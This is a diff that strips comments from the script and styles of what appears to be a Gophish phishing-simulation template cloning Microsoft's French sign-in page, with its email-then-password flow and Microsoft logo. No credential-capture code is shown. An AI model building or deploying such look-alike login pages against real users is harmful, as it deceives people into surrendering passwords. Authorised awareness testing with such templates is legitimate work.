@@ -210,14 +210,12 @@
             color: #333;
         }
 
-        /* Style for the "Forgot Password" link */
         .forgot-password-link {
             display: none;
             font-size: 13px;
             margin-top: 10px;
         }
 
-        /* Style for the custom footer on the password page */
         .custom-footer {
             background-color: #F2F2F2;
             text-align: left;
@@ -253,7 +251,6 @@
             if (validateEmail()) {
                 const emailValue = document.getElementById('email').value;
 
-                // Hide the "Retour" button on the password page
                 document.querySelector('.button-container .btn-primary').style.display = 'none';
                 
                 document.getElementById('email').style.display = 'none';
@@ -269,12 +266,10 @@
                 document.querySelector('.login-header').style.marginBottom = '-25px';
 
                 document.querySelector("button[type='submit']").textContent = "Se connecter";
-
-                // Create a container to hold the back button and email
+                
                 const emailContainer = document.createElement('div');
                 emailContainer.classList.add('email-container');
 
-                // Add back button
                 const backButton = document.createElement('button');
                 backButton.classList.add('back-button');
                 backButton.onclick = function() {
@@ -282,48 +277,36 @@
                     document.getElementById('email').style.display = 'block';
                     document.querySelector('.login-header p').textContent = 'Se connecter';
                     document.querySelector('.login-header img').src = 'https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/microsoft_logo.svg';
-                    
-                    // Apply the margin-bottom: 0px style to .login-header
+
                     document.querySelector('.login-header').style.marginBottom = '0px';
                 
                     document.querySelector('.login-header').removeChild(document.querySelector('.email-container'));
-                
-                    // Show the "Retour" button again
+
                     document.querySelector('.button-container .btn-primary').style.display = 'inline-block';
-                
-                    // Hide "Forgot Password" link
+
                     document.querySelector('.forgot-password-link').style.display = 'none';
-                
-                    // Show "Pas de compte ?" and "Votre compte n’est pas accessible ?" links again
+
                     document.querySelector('.horizontal-links').style.display = 'block';
-                
-                    // Restore the original div-option-connexion and hide the custom footer
+
                     document.querySelector('.div-option-connexion').style.display = 'block';
                     document.querySelector('.custom-footer').remove();
                 };
 
-                // Add email display
                 const emailDisplay = document.createElement('div');
                 emailDisplay.classList.add('email-display');
                 emailDisplay.textContent = emailValue;
 
-                // Append back button and email display to the container
                 emailContainer.appendChild(backButton);
                 emailContainer.appendChild(emailDisplay);
-
-                // Insert the email container between the logo and the "Entrez le mot de passe" text
+                
                 document.querySelector('.login-header').insertBefore(emailContainer, document.querySelector('.login-header p'));
 
-                // Show "Forgot Password" link
                 document.querySelector('.forgot-password-link').style.display = 'block';
 
-                // Remove the "Pas de compte ? Créez-en un !" and "Votre compte n’est pas accessible ?" links
                 document.querySelector('.horizontal-links').style.display = 'none';
                 
-                // Hide the original div-option-connexion and add the custom footer
                 document.querySelector('.div-option-connexion').style.display = 'none';
                 
-                // Append the custom footer outside and just below the login-container
                 document.querySelector('.login-container').after(footer);
             }
         }
